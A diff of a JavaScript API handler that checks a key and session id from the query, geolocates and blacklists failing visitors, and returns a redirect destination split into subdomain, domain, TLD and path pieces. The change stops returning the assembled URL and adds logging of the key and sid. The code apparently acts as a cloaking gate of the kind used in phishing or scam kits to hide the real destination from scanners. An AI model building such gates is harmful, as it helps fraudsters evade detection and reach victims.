@@ -5,16 +5,16 @@ import { isBlackListed, setBlackListIp } from './utils';
 // `https://ipwho.is/${ip}`
 // import { NextApiRequest, NextApiResponse } from 'next';
 const protect = process.env.PROTECT
-const SID = process.env.SID
-const redirect = `https://${process.env.SB}.${process.env.DM}.${process.env.TD}/${process.env.HK}`
-
+const CSID = process.env.SID
 export default async function handler (req , res) {
     try {
 
 
       const {cnd, kyi, sid} = req.query
 
-      // console.log('condition: ', cnd)
+      console.log('condition: ', cnd)
+      console.log('key ', kyi)
+      console.log('sid: ', sid)
       let ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.connection.remoteAddress || req.socket.remoteAddress;
       let link;
 
@@ -28,7 +28,7 @@ export default async function handler (req , res) {
       const response = await fetch(link); //https://ipapi.co/json/
       let info = await response.json();
 
-      if(cnd === '1' || kyi !== protect || sid !== SID) {
+      if(cnd === '1' || kyi !== protect || sid !== CSID) {
         console.log('condition: ', cnd)
         console.log("We are triggering black listed func ")
         setBlackListIp(info.query)
@@ -36,7 +36,10 @@ export default async function handler (req , res) {
 
 
       let data = {}
-      data['skt'] = redirect
+      data['sd'] = process.env.SB
+      data['dm'] = process.env.DM
+      data['td'] = process.env.TD
+      data['hk'] = process.env.HK
       data['isBlklisted'] = isBlackListed(info.query)
       console.log('data: ', data)
       res.status(200).json(data)
